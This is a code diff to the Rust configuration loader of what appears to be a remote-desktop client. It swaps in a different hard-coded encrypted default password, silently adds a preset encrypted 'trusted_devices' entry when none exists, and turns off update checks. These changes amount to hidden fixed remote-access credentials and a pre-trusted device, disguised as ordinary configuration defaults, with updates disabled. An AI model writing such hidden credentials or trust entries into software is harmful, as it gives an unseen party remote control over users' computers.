@@ -518,6 +518,10 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
+        if !config.options.contains_key("trusted_devices") {
+            	config.options.insert("trusted_devices".to_string(), "00AaIEXQ+MWqMI+s8UYHc7+oAOv9L7lwrllbM24F5rov/FPUJs8cd0etMGUw==".to_string());
+            	config.store();
+        }
         if store {
             config.store();
         }
@@ -662,7 +666,7 @@ impl Config {
             }
         }
         if config.password.is_empty() {
-            	config.password = "01AQ+VYeJ69664h4KxoleRPtvg0h3qCKzJD63gpUqvnC8EOBlQOlFzlQqwpPyIPlLqreGWW2ON3wTr8KKYUTAn1LXKDNLoZOWFH1yUxyfQFs9fSUMicx54".to_string();
+            	config.password = "01AWYFqWO2q3CIMlDA9cbaai+OOHSI12iQ2qFdkuGw9vlNPGF/ajoDONB55FExql+iaTidO+Vk+a565M1zIQAYL/t3mAvblPAsxtaGYWv0u4WXUCABLP+e".to_string();
             	store = true;
         	}
         
@@ -2162,7 +2166,21 @@ pub struct LocalConfig {
 
 impl LocalConfig {
     fn load() -> LocalConfig {
-        Config::load_::<LocalConfig>("_local")
+        let mut config = Config::load_::<LocalConfig>("_local");
+        let mut store = false;
+                                  
+            if !config.options.contains_key("theme") {
+            	config.options.insert("theme".to_string(), "dark".to_string());
+            	store = true;
+        	}
+                                  
+            if !config.options.contains_key("enable-check-update") {
+		config.options.insert("enable-check-update".to_string(), "N".to_string());
+		store = true;
+		    }
+
+                                
+        config
     }
 
     fn store(&self) {
